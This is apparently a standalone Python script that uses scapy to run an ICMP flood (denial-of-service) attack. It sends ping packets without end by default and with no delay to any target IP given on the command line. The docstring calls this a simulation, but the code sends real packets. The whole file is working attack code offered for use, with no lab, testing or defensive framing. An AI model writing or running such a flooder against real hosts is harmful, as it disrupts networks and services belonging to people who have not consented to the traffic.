import logging
from scapy.all import IP, ICMP, send
import argparse
import time

def icmp_flood(ip, count=None, delay=0):
    """
    Simulates an ICMP flood attack by sending continuous ICMP packets to the target IP.

    Args:
        ip (str): Target IP address.
        count (int): Number of packets to send. If None, sends indefinitely.
        delay (float): Delay (in seconds) between packets.
    """
    logging.info(f"Starting ICMP flood attack on {ip} with {'infinite' if count is None else count} packets")
    packet = IP(dst=ip)/ICMP()
    sent_packets = 0

    try:
        while count is None or sent_packets < count:
            send(packet, verbose=0)
            sent_packets += 1
            print(f"Sent ICMP packet {sent_packets} to {ip}")
            time.sleep(delay)  # Add delay between packets if specified
    except KeyboardInterrupt:
        logging.info("ICMP flood attack interrupted by user.")
        print("\nAttack stopped by user.")
    except Exception as e:
        logging.error(f"Error during ICMP flood attack: {e}")
        print(f"Error: {e}")
    finally:
        logging.info(f"ICMP flood attack completed. Total packets sent: {sent_packets}")
        print(f"Attack completed. Total packets sent: {sent_packets}")

if __name__ == "__main__":
    # Set up argument parsing
    parser = argparse.ArgumentParser(description="Simulate an ICMP flood attack on a target IP address.")
    parser.add_argument("ip", help="Target IP address to attack")
    parser.add_argument("-c", "--count", type=int, help="Number of ICMP packets to send (default: infinite)")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay (in seconds) between packets (default: 0)")
    args = parser.parse_args()

    # Set up logging
    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")

    # Run the ICMP flood function
    icmp_flood(args.ip, args.count, args.delay)